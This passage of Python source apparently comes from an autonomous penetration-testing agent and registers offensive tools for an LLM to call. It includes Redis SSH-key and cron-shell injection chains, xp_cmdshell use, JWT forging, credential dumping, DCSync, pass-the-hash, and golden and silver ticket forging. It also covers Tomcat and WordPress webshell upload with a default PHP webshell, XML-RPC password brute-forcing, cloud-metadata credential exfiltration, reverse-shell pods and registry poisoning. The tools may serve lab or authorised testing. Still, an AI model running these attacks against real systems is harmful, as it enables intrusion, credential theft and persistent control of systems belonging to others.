            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="psql_query",
        command_template="PGPASSWORD={password} psql -h {host} -p {port} -U {user} -c '{query}' 2>&1",
        description="Execute a SQL query on a PostgreSQL database. Use for data extraction, COPY PROGRAM execution, and reading files.",
        parameters={
            "host": {"type": "string", "description": "PostgreSQL host IP or hostname"},
            "port": {"type": "integer", "description": "PostgreSQL port (default 5432)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="redis_cmd",
        command_template="redis-cli -h {host} -p {port} {command} 2>&1",
        description="Execute a single command on a Redis server. Call once per command. Use for data extraction (KEYS *, GET key). SSH key injection requires a CHAIN of separate calls: redis_cmd(host,port,'CONFIG SET dir /root/.ssh') → redis_cmd(host,port,'CONFIG SET dbfilename authorized_keys') → redis_cmd(host,port,'SET key \"\\n\\nssh-rsa AA...\"') → redis_cmd(host,port,'SAVE'). Cron shell: CONFIG SET dir /var/spool/cron/crontabs → CONFIG SET dbfilename root → SET key 'cmd' → SAVE. Also: CONFIG GET (check config), FLUSHALL (clear data), INFO (server info).",
        parameters={
            "host": {"type": "string", "description": "Redis host IP or hostname"},
            "port": {"type": "integer", "description": "Redis port (default 6379)"},
            "command": {"type": "string", "description": "Redis command to execute (e.g. 'KEYS *', 'GET flag', 'INFO')"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="mssql_query",
        command_template="sqlcmd -S {host},{port} -U {user} -P '{password}' -Q '{query}' 2>&1",
        description="Execute a SQL query on a Microsoft SQL Server. Use for data extraction, xp_cmdshell enabling, and linked server enumeration.",
        parameters={
            "host": {"type": "string", "description": "MSSQL host IP or hostname"},
            "port": {"type": "integer", "description": "MSSQL port (default 1433)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="oracle_query",
        command_template="printf '%s\n' '{query}' | sqlplus -S {user}/{password}@//{host}:{port}/{sid} 2>&1",
        description="Execute a SQL query on an Oracle Database. Use for data extraction, privilege escalation via PL/SQL, and TNS listener interaction.",
        parameters={
            "host": {"type": "string", "description": "Oracle host IP or hostname"},
            "port": {"type": "integer", "description": "Oracle port (default 1521)"},
            "user": {"type": "string", "description": "Database username"},
            "password": {"type": "string", "description": "Database password"},
            "sid": {"type": "string", "description": "Oracle SID or service name"},
            "query": {"type": "string", "description": "SQL query to execute"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="jwt_forge",
        command_template="python3 -c \"import jwt,json,time,base64; payload=json.loads(base64.b64decode('{claims_b64}').decode()); print(jwt.encode(payload,'{secret}',algorithm='{algorithm}'))\" 2>&1",
        description="Forge a JSON Web Token (JWT) using a known secret or signing key. Use for authentication bypass when a JWT secret is hardcoded or discovered. Pass claims as base64-encoded JSON string (use base64.b64encode on the JSON claims).",
        parameters={
            "secret": {"type": "string", "description": "JWT signing secret or key"},
            "algorithm": {"type": "string", "description": "JWT algorithm (HS256, HS384, HS512, RS256). Default HS256."},
            "claims_b64": {"type": "string", "description": "Base64-encoded JSON claims payload (e.g. base64 of '{\"sub\":\"admin\"}')"},
        },
        parser=_parse_shell_output,
        timeout=15,
    )

    # ── Active Directory Tools ─────────────────────────────────────

    gateway.register_shell_tool(
        name="netexec_enum",
        command_template="netexec smb {target} --shares 2>&1",
        description="Enumerate SMB shares on a target host using NetExec",
        parameters={"target": {"type": "string", "description": "Target IP or hostname"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="netexec_ldap_enum",
        command_template="netexec ldap {target} -u {user} -p '{password}' --users 2>&1",
        description="Enumerate AD users via LDAP using NetExec",
        parameters={"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_secretsdump",
        command_template="impacket-secretsdump {target} 2>&1 | head -100",
        description="Dump SAM/LSA secrets from a target using impacket-secretsdump. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_psexec",
        command_template="impacket-psexec {target} 2>&1",
        description="Execute commands on a remote Windows host via PsExec. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_wmiexec",
        command_template="impacket-wmiexec {target} 2>&1",
        description="Execute commands via WMI on a remote Windows host. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="ldapsearch_ad",
        command_template="ldapsearch -x -H ldap://{target} -D '{user}@{domain}' -w '{password}' -b '{base_dn}' 2>&1 | head -50",
        description="Query Active Directory via LDAP. Use to enumerate users, groups, OUs, and domain trust relationships.",
        parameters={"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}, "domain": {"type": "string"}, "base_dn": {"type": "string"}},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="impacket_GetUserSPNs",
        command_template="impacket-GetUserSPNs {target} -request 2>&1 | head -80",
        description="Kerberoasting: request TGS tickets for users with SPNs. Encrypted tickets can be cracked offline. Target format: DOMAIN/USER:PASSWORD@DC_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
        parser=_parse_shell_output,
        timeout=120,
    )
    gateway.register_shell_tool(
        name="impacket_GetNPUsers",
        command_template="impacket-GetNPUsers {target} -request -format hashcat 2>&1 | head -80",
        description="AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Hashcat-format output for offline cracking. Target format: DOMAIN/USER:PASSWORD@DC_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
        parser=_parse_shell_output,
        timeout=120,
    )
    gateway.register_shell_tool(
        name="impacket_secretsdump_dcsync",
        command_template="impacket-secretsdump -just-dc {target} 2>&1 | head -100",
        description="DCSync: replicate domain credentials from a Domain Controller. Requires Replication-Get-Changes-All privilege. Target format: DOMAIN/USER:PASSWORD@DC_IP",
        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
        parser=_parse_shell_output,
        timeout=180,
    )
    gateway.register_shell_tool(
        name="impacket_pth",
        command_template="impacket-psexec -hashes :{nthash} {target} 2>&1",
        description="Pass-the-Hash: execute commands on a remote Windows host using an NTLM hash instead of a password. Target format: DOMAIN/USER@TARGET_IP. Requires the user's NTLM hash (from secretsdump or DCSync).",
        parameters={
            "nthash": {"type": "string", "description": "NTLM hash (NT part, 32 hex chars)"},
            "target": {"type": "string", "description": "DOMAIN/USER@TARGET_IP"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="impacket_ticketer",
        command_template="impacket-ticketer -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
        description="Golden Ticket: forge a Kerberos TGT using the KRBTGT account hash. Grants domain-wide persistence and privilege escalation. Requires KRBTGT NTLM hash and domain SID.",
        parameters={
            "krbtgt_hash": {"type": "string", "description": "KRBTGT account NTLM hash"},
            "domain_sid": {"type": "string", "description": "Domain SID (e.g. S-1-5-21-...)"},
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "user": {"type": "string", "description": "Username to impersonate (default: Administrator)"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Silver Ticket ──────────────────────────────────────────────

    gateway.register_shell_tool(
        name="impacket_silver_ticket",
        command_template="impacket-ticketer -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
        description="Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.",
        parameters={
            "service_hash": {"type": "string", "description": "Target service account NTLM hash (32 hex chars)"},
            "domain_sid": {"type": "string", "description": "Domain SID (e.g. S-1-5-21-...)"},
            "domain": {"type": "string", "description": "Fully qualified domain name"},
            "service_spn": {"type": "string", "description": "Service SPN (e.g. 'cifs/dc.domain.com', 'http/web.domain.com', 'HOST/dc.domain.com')"},
            "user": {"type": "string", "description": "Username to impersonate (default: Administrator)"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Tomcat Exploitation ────────────────────────────────────────

    gateway.register_shell_tool(
        name="tomcat_exploit",
        command_template=(
            "python3 -c \""
            "import requests, base64\n"
            "b64 = '{payload_b64}'.encode()\n"
            "data = base64.b64decode(b64)\n"
            "files = {{'file': ('{filename}', data)}}\n"
            "try:\n"
            "    r = requests.{http_method}('{target_url}', files=files, timeout=30, verify=False)\n"
            "    print(f'Status: {{r.status_code}}')\n"
            "    print(r.text[:2000])\n"
            "except Exception as e:\n"
            "    print(f'Error: {{e}}')\n"
            "\" 2>&1",
        ),
        description="Tomcat exploitation: upload a malicious file (WAR/JSP) to Tomcat manager or upload endpoint. Use for CVE-2025-24813 (deserialization upload) or deploying webshells. Provide payload as base64-encoded content. Combine with send_payload for advanced payload construction.",
        parameters={
            "target_url": {"type": "string", "description": "Tomcat upload URL (e.g. 'http://host:8080/manager/html/upload')"},
            "payload_b64": {"type": "string", "description": "Base64-encoded payload content (WAR file or JSP shell)"},
            "filename": {"type": "string", "description": "Filename for upload (e.g. 'shell.war', 'exploit.jsp')"},
            "http_method": {"type": "string", "description": "HTTP method: PUT for CVE-2024-50379 race condition, POST for standard uploads"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── File Upload (multipart) ─────────────────────────────────────

    async def _file_upload(**kwargs) -> ToolResult:
        """Upload a file to a target URL via multipart POST (curl -F).

        Creates a temporary file from the provided content, uploads it
        to the target URL with the given field name, and returns the
        server response.  Use for unauthenticated file upload exploits
        (e.g. WordPress plugin upload endpoints, PHP webshell delivery).

        Uses subprocess_exec (argument list, no shell) — all user-supplied
        values are passed as individual argv entries, eliminating shell
        injection risk.
        """
        import tempfile as _tmp, os as _os

        url = (kwargs.get("url") or "").strip()
        field = kwargs.get("field", "file")
        filename = kwargs.get("filename", "payload.php")
        content = kwargs.get("content", '<?php system($_GET["cmd"]); ?>')
        timeout_s = max(5, int(kwargs.get("timeout", 30)))

        if not url or not url.startswith("http"):
            return ToolResult(tool_name="file_upload", success=False,
                stdout="", stderr=f"Invalid URL: '{url}'", exit_code=1, elapsed_ms=0)

        # Parse extra fields
        extra = kwargs.get("extra_fields", {}) or {}
        if isinstance(extra, str):
            try:
                import json as _json
                extra = _json.loads(extra)
            except Exception:
                extra = {}

        tmp_path = ""
        try:
            # Write content to a temporary file
            with _tmp.NamedTemporaryFile(
                mode="w", suffix="_" + filename, delete=False,
            ) as _tf:
                _tf.write(content)
                tmp_path = _tf.name

            # Build argument list (no shell — safe against injection)
            cmd_args = [
                "curl", "-s", "-k", "-X", "POST",
                "-F", f"{field}=@{tmp_path};filename={filename}",
                "--connect-timeout", "10",
                "--max-time", str(timeout_s),
                "-w", "\n%{http_code}",
                url,
            ]
            for k, v in extra.items():
                cmd_args.extend(["-F", f"{k}={v}"])

            import time as _time
            _start = _time.perf_counter()
            proc = await asyncio.create_subprocess_exec(
                *cmd_args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout_s + 10,
            )
            stdout_s = stdout.decode("utf-8", errors="replace")
            stderr_s = stderr.decode("utf-8", errors="replace")
            _elapsed = (_time.perf_counter() - _start) * 1000

            # Parse HTTP status from curl -w output (last line)
            _http_status = 0
            _lines = stdout_s.strip().split("\n")
            if _lines:
                try:
                    _http_status = int(_lines[-1].strip())
                except ValueError:
                    pass
            _ok = (proc.returncode == 0
                   and _http_status not in (0, 400, 401, 403, 404, 405, 500, 502, 503))

            # ── Auto-retry with common extra_fields patterns ──────────
            # Many plugin upload endpoints require additional POST params
            # (IDs, directories, nonces).  When the first attempt fails
            # and no extra_fields were provided, try built-in patterns
            # automatically — no LLM round-trip needed.
            _auto_retries = []
            if not _ok and not extra:
                _auto_patterns = [
                    {"eeSFL_ID": "1",
                     "eeSFL_FileUploadDir": "/wp-content/uploads/"},
                    {"eeSFL_ID": "1",
                     "eeSFL_FileUploadDir": "/wp-content/uploads/simple-file-list/"},
                    {"action": "upload"},
                    {"upload": "1", "dir": "/"},
                ]
                for _ap in _auto_patterns:
                    _rcmd = cmd_args[:]
                    # Remove old -w and url, then re-add after extra fields
                    _rcmd.pop()  # url
                    _rcmd.pop()  # -w value
                    _rcmd.pop()  # -w
                    for _k, _v in _ap.items():
                        _rcmd.extend(["-F", f"{_k}={_v}"])
                    _rcmd.extend(["-w", "\n%{http_code}", url])
                    try:
                        _rp = await asyncio.create_subprocess_exec(
                            *_rcmd,
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                        )
                        _rout, _rerr = await asyncio.wait_for(
                            _rp.communicate(), timeout=timeout_s + 10,
                        )
                        _rs = _rout.decode("utf-8", errors="replace")
                        _rl = _rs.strip().split("\n")
                        _rst = 0
                        if _rl:
                            try:
                                _rst = int(_rl[-1].strip())
                            except ValueError:
                                pass
                        _auto_retries.append((_rst, _rs, _ap))
                        if _rst not in (0, 400, 401, 403, 404, 405, 500, 502, 503):
                            # Found a working pattern — stop trying more
                            break
                    except Exception:
                        pass

            if _auto_retries:
                _best = min(_auto_retries, key=lambda x: x[0] if x[0] >= 200 else 999)
                _rst, _rs, _ap = _best
                stdout_s += (
                    f"\n\n[AUTO-RETRY] Tried {len(_auto_retries)} extra_fields patterns. "
                    f"Best: {_ap} → HTTP {_rst}"
                )
                if _rst not in (0, 400, 401, 403, 404, 405, 500, 502, 503):
                    _http_status = _rst
                    _ok = True

            return ToolResult(
                tool_name="file_upload", success=_ok,
                stdout=stdout_s, stderr=stderr_s,
                exit_code=_http_status or proc.returncode or 0,
                elapsed_ms=_elapsed,
            )

        except asyncio.TimeoutError:
            return ToolResult(tool_name="file_upload", success=False,
                stdout="", stderr=f"Upload timed out after {timeout_s}s",
                exit_code=-1, elapsed_ms=timeout_s * 1000)
        except Exception as e:
            return ToolResult(tool_name="file_upload", success=False,
                stdout="", stderr=str(e), exit_code=1, elapsed_ms=0)
        finally:
            if tmp_path:
                try:
                    _os.unlink(tmp_path)
                except OSError:
                    pass

    gateway.register(
        name="file_upload",
        func=_file_upload,
        description="Upload a file via multipart POST (curl -F). Use for unauthenticated file upload exploits — WordPress plugin RCE, PHP webshell delivery, arbitrary file upload vulnerabilities. IMPORTANT: many plugin upload endpoints require additional POST parameters (IDs, directories, nonces). If you get HTTP 400/403/500, use extra_fields to add required form fields. Example: extra_fields={\"eeSFL_ID\":\"1\", \"eeSFL_FileUploadDir\":\"/wp-content/uploads/\"}",
        parameters={
            "url": {"type": "string", "description": "Upload endpoint URL (e.g. 'http://target/wp-content/plugins/x/ee-upload-engine.php')"},
            "field": {"type": "string", "description": "Form field name for the file (default: 'file')"},
            "filename": {"type": "string", "description": "Filename to upload (default: 'payload.php'). Use .php extension for PHP webshells."},
            "content": {"type": "string", "description": "File content to upload (default: simple PHP webshell '<?php system($_GET[\"cmd\"]); ?>')"},
            "timeout": {"type": "integer", "description": "Upload timeout in seconds (default: 30)"},
            "extra_fields": {"type": "object", "description": "Additional form fields as JSON object. REQUIRED for many plugins. Example: {\"eeSFL_ID\": \"1\", \"eeSFL_FileUploadDir\": \"/wp-content/uploads/\"} or {\"action\": \"upload\", \"nonce\": \"...\"}. Look for required POST params in plugin docs or error responses."},
        },
    )

    # ── WordPress Exploitation ──────────────────────────────────────

    async def _wpscan_enum(**kwargs) -> ToolResult:
        """Run wpscan with sensible defaults when no API token is available.

        Without an API token, wpscan cannot check for vulnerable plugins/themes
        (vp/vt flags), but it CAN still enumerate installed plugins, themes, and
        users.  This wrapper degrades the enum_mode automatically and omits the
        --api-token flag entirely when the token is empty.

        The token is read from: (1) the LLM-provided api_token parameter,
        (2) the WPSCAN_API_TOKEN env var, or (3) config/darwin.yaml → wpscan.api_token.

        When the daily API quota is exhausted, the tool automatically retries
        without the token so at least basic enumeration still works.
        """
        import os as _os

        target_url = kwargs.get("target_url", "")
        enum_mode = kwargs.get("enum_mode", "p,u")
        api_token = (kwargs.get("api_token") or "").strip()

        # Resolve token: LLM param → env var → darwin.yaml config
        if not api_token:
            api_token = _os.environ.get("WPSCAN_API_TOKEN", "")
        if not api_token:
            try:
                import yaml as _yaml
                _config_path = Path(__file__).parent.parent.parent / "config" / "darwin.yaml"
                if _config_path.exists():
                    with open(_config_path) as _f:
                        _cfg = _yaml.safe_load(_f) or {}
                    api_token = (_cfg.get("wpscan", {}) or {}).get("api_token", "") or ""
            except Exception:
                pass

        has_token = bool(api_token and api_token.strip())

        # ── Core runner ──────────────────────────────────────────
        async def _run(use_token: bool) -> tuple[str, str, int, float]:
            mode = enum_mode
            parts = ["wpscan", "--url", target_url, "--no-banner"]
            if use_token:
                parts += ["--api-token", api_token]
                # Upgrade basic enumeration to vulnerability detection when token
                # is available.  LLM often passes p,t,u not knowing a token exists.
                _upgraded = []
                for _flag in mode.split(","):
                    _flag = _flag.strip()
                    if _flag == "p":
                        _flag = "vp"
                    elif _flag == "t":
                        _flag = "vt"
                    _upgraded.append(_flag)
                mode = ",".join(_upgraded)
            else:
                # Degrade vulnerability checks to basic enumeration (no token needed)
                mode = mode.replace("vp", "p").replace("vt", "t")
            parts += ["--enumerate", mode]
            cmd = " ".join(parts) + " 2>&1 | head -500"

            import time as _time
            _start = _time.perf_counter()
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            _stdout, _stderr = await asyncio.wait_for(
                proc.communicate(), timeout=120,
            )
            _elapsed = (_time.perf_counter() - _start) * 1000
            return (
                _stdout.decode("utf-8", errors="replace"),
                _stderr.decode("utf-8", errors="replace"),
                proc.returncode or 0,
                _elapsed,
            )

        _API_LIMIT_PATTERNS = [
            "api limit has been reached",
            "api limit reached",
            "api request limit",
            "daily api limit",
            "you have reached your api",
            "exceeded the number of requests",
            "too many requests",
            "rate limit exceeded",
        ]

        # ── First run (with token if available) ─────────────────
        try:
            stdout_s, stderr_s, exit_code, elapsed = await _run(has_token)
        except asyncio.TimeoutError:
            return ToolResult(
                tool_name="wpscan_enum", success=False,
                stdout="", stderr="wpscan timed out after 120s",
                exit_code=-1, elapsed_ms=120000,
            )

        # Detect API quota exhaustion and retry without token
        if has_token:
            combined = (stdout_s + " " + stderr_s).lower()
            quota_hit = any(p in combined for p in _API_LIMIT_PATTERNS)

            # Also detect: token provided but no vulnerability data returned
            # (wpscan should report CVEs / vulnerability sections with a valid token)
            has_vuln_data = (
                "vulnerability" in combined
                or "cve-" in combined
                or "[critical]" in combined
            )

            if quota_hit or not has_vuln_data:
                if quota_hit:
                    degraded_note = (
                        "\n\n[WPSCAN] API quota exhausted — retried without token. "
                        "Basic enumeration results follow.\n"
                    )
                else:
                    degraded_note = (
                        "\n\n[WPSCAN] No vulnerability data returned (token may be "
                        "invalid or quota exhausted) — retried without token.\n"
                    )

                # Re-run without token (timeout → keep original output)
                try:
                    stdout_s2, stderr_s2, exit_code2, elapsed2 = await _run(False)
                    stdout_s = degraded_note + stdout_s2
                    stderr_s = stderr_s2
                    exit_code = exit_code2
                    elapsed += elapsed2
                except asyncio.TimeoutError:
                    stdout_s = degraded_note + "\n[WPSCAN] Retry timed out — original results above.\n"

        parsed = _parse_shell_output(stdout_s)
        return ToolResult(
            tool_name="wpscan_enum",
            success=exit_code == 0,
            stdout=stdout_s,
            stderr=stderr_s,
            exit_code=exit_code,
            elapsed_ms=elapsed,
            parsed_output=parsed,
        )

    gateway.register(
        name="wpscan_enum",
        func=_wpscan_enum,
        description="WordPress vulnerability scanner using wpscan. Enumerate plugins, themes, users, and vulnerable components. Use when whatweb_scan identifies a WordPress installation. If no API token is available, vulnerability checking (vp/vt) degrades to plugin/theme listing (p/t) automatically.",
        parameters={
            "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
            "enum_mode": {"type": "string", "description": "Enumeration mode: 'vp' (vulnerable plugins), 'vt' (vulnerable themes), 'u' (users), 'p' (all plugins), 't' (all themes), or combined e.g. 'p,u'"},
            "api_token": {"type": "string", "description": "WPScan API token (leave empty if not available — plugin/theme/user listing still works)"},
        },
    )

    gateway.register_shell_tool(
        name="wp_xmlrpc_brute",
        command_template=(
            "python3 -c \"\n"
            "import requests, sys\n"
            "url = '{target_url}/xmlrpc.php'\n"
            "users = '{users}'.split(',')\n"
            "passwords = '{passwords}'.split(',')\n"
            "for u in users:\n"
            "    for p in passwords:\n"
            "        xml = '''<?xml version=\\\\\\\"1.0\\\\\\\"?><methodCall><methodName>wp.getUsers</methodName>"
            "<params><param><value><string>'''+u+'''</string></value></param>"
            "<param><value><string>'''+p+'''</string></value></param></params></methodCall>'''\n"
            "        try:\n"
            "            r = requests.post(url, data=xml, timeout=10)\n"
            "            if r.status_code == 200 and 'faultCode' not in r.text:\n"
            "                print(f'SUCCESS: {{u}}:{{p}}')\n"
            "                print(r.text[:500])\n"
            "        except: pass\n"
            "\" 2>&1 | head -50",
        ),
        description="Brute-force WordPress credentials via xmlrpc.php using wp.getUsers method. Use when you have identified a WordPress site and need to test weak credentials. Provide comma-separated username and password lists.",
        parameters={
            "target_url": {"type": "string", "description": "WordPress base URL (e.g. 'http://target/wordpress')"},
            "users": {"type": "string", "description": "Comma-separated usernames (e.g. 'admin,editor')"},
            "passwords": {"type": "string", "description": "Comma-separated passwords (e.g. 'password,admin,123456')"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )

    # ── Oracle TNS Poisoning ───────────────────────────────────────

    gateway.register_shell_tool(
        name="oracle_tns_poison",
        command_template=(
            "python3 -c \"\n"
            "import socket, struct\n"
            "host = '{target_host}'\n"
            "port = {tns_port}\n"
            "sid = '{sid}'\n"
            "desc = f'(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST={{host}})(PORT={{port}}))(CONNECT_DATA=(SID={{sid}})))'\n"
            "payload = desc.encode()\n"
            "pkt_len = len(payload) + 8\n"
            "header = struct.pack('>HH', pkt_len, 6) + b'\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00'\n"
            "sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "sock.settimeout(10)\n"
            "try:\n"
            "    sock.connect((host, port))\n"
            "    sock.send(header + payload)\n"
            "    resp = sock.recv(4096)\n"
            "    print(f'Sent TNS CONNECT packet to {{host}}:{{port}} for SID={{sid}}')\n"
            "    print(f'Response ({{len(resp)}} bytes): {{resp[:500]}}')\n"
            "    sock.close()\n"
            "except Exception as e:\n"
            "    print(f'TNS error: {{e}}')\n"
            "\" 2>&1 | head -50",
        ),
        description="Oracle TNS Poisoning: send a crafted TNS CONNECT packet to an Oracle listener. Used for SID enumeration and TNS protocol attacks (DB-03 Oracle TNS scenario). Use when Oracle listener is detected on port 1521.",
        parameters={
            "target_host": {"type": "string", "description": "Target Oracle DB host IP"},
            "tns_port": {"type": "integer", "description": "TNS listener port (default 1521)"},
            "sid": {"type": "string", "description": "Oracle SID to test (e.g. 'ORCL', 'XE', 'ORACLE')"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )

    # ── Kubernetes Tools ───────────────────────────────────────────

    gateway.register_shell_tool(
        name="kubectl_auth_check",
        command_template="kubectl auth can-i --list --as={sa} -n {namespace} 2>&1",
        description="Check Kubernetes RBAC permissions for a service account in a namespace",
        parameters={"sa": {"type": "string", "description": "Service account name"}, "namespace": {"type": "string", "description": "K8s namespace"}},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="kubectl_get_secrets",
        command_template="kubectl get secrets -n {namespace} -o json 2>&1 | head -100",
        description="List Kubernetes secrets in a namespace",
        parameters={"namespace": {"type": "string", "description": "K8s namespace"}},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="check_capabilities",
        command_template="capsh --print 2>/dev/null || cat /proc/1/status 2>/dev/null | grep -i cap",
        description="Check current container capabilities (Linux capabilities, useful for container escape assessment)",
        parameters={},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="check_mounts",
        command_template="findmnt -l 2>/dev/null | grep -E '(docker.sock|hostPath|proc|sys|dev)' || mount 2>/dev/null | grep -E '(docker|proc|host)'",
        description="Check mounted filesystems for container escape vectors (docker.sock, hostPath volumes, /proc, /sys)",
        parameters={},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="check_cloud_metadata",
        command_template="curl -sf --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo 'not-reachable'",
        description="Check if AWS IMDS cloud metadata endpoint is accessible (for cloud credential exfiltration)",
        parameters={},
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="kubectl_get_pods",
        command_template="kubectl get pods -A -o json 2>&1 | head -200",
        description="List all pods in the Kubernetes cluster across all namespaces",
        parameters={},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="kubectl_run",
        command_template="kubectl run {name} --image={image} --restart=Never -n {namespace} --command -- {command} 2>&1",
        description="Create and run a pod in Kubernetes. Use for deploying test containers, privilege escalation pods, or reverse shells. Requires namespace creation permissions.",
        parameters={
            "name": {"type": "string", "description": "Pod name (e.g. 'test-pod')"},
            "image": {"type": "string", "description": "Container image (e.g. 'busybox', 'ubuntu')"},
            "namespace": {"type": "string", "description": "K8s namespace"},
            "command": {"type": "string", "description": "Command to run in the container"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="etcdctl_get",
        command_template="ETCDCTL_API=3 etcdctl --endpoints={endpoint} get / --prefix --keys-only 2>&1 | head -100",
        description="Query etcd key-value store directly. etcd stores all Kubernetes cluster state including Secrets. Use after discovering etcd endpoint (port 2379). Requires network access to etcd.",
        parameters={
            "endpoint": {"type": "string", "description": "etcd endpoint (e.g. 'https://10.0.0.1:2379')"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="kubelet_probe",
        command_template="curl -sk https://{host}:10250/pods 2>&1 | head -100",
        description="Probe the Kubelet API (port 10250) for pod information. Unauthenticated access reveals running pods on the node. Use for container escape reconnaissance.",
        parameters={
            "host": {"type": "string", "description": "Node IP or hostname running kubelet"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="sa_token_read",
        command_template="cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 && echo '---CA---' && cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>&1 | head -5",
        description="Read the Kubernetes ServiceAccount token and CA certificate from the default pod mount point. Use to authenticate to the K8s API server from within a pod.",
        parameters={},
        parser=_parse_shell_output,
        timeout=15,
    )
    gateway.register_shell_tool(
        name="kubectl_get_clusterrolebindings",
        command_template="kubectl get clusterrolebindings -o json 2>&1 | head -200",
        description="List all ClusterRoleBindings in the cluster. Use to identify over-privileged subjects and potential RBAC escalation paths.",
        parameters={},
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="kubectl_exec",
        command_template="kubectl exec {pod} -n {namespace} -- {command} 2>&1",
        description="Execute a command inside a running Kubernetes pod. Use for post-exploitation after gaining pod access.",
        parameters={
            "pod": {"type": "string", "description": "Pod name"},
            "namespace": {"type": "string", "description": "K8s namespace"},
            "command": {"type": "string", "description": "Command to execute inside the pod"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="docker_registry",
        command_template="docker pull {image} 2>&1 && docker tag {image} {target_registry}/{image_name} 2>&1 && docker push {target_registry}/{image_name} 2>&1",
        description="Pull, tag, and push a Docker image to a target registry. Use for container registry poisoning attacks (K8S-09 supply chain).",
        parameters={
            "image": {"type": "string", "description": "Source image (e.g. 'busybox:latest')"},
            "target_registry": {"type": "string", "description": "Target registry (e.g. 'localhost:5000')"},
            "image_name": {"type": "string", "description": "Image name at target registry"},
        },
        parser=_parse_shell_output,
        timeout=120,
    )
    gateway.register_shell_tool(
        name="helm",
        command_template="helm {command} 2>&1",
        description="Execute a Helm command. Use for Helm v2 Tiller abuse (K8S-10) — list releases, install charts, or interact with Tiller gRPC when cluster-admin access is available.",
        parameters={
            "command": {"type": "string", "description": "Full helm command (e.g. 'list --all', 'install ...')"},
        },
        parser=_parse_shell_output,
        timeout=60,
    )
    gateway.register_shell_tool(
        name="searchsploit_copy",
        command_template="searchsploit -m {exploit_id} 2>&1 && cat $(searchsploit -p {exploit_id} 2>/dev/null | grep 'Path:' | head -1 | awk '{{print $NF}}' | tr -d $'\\r') 2>/dev/null",
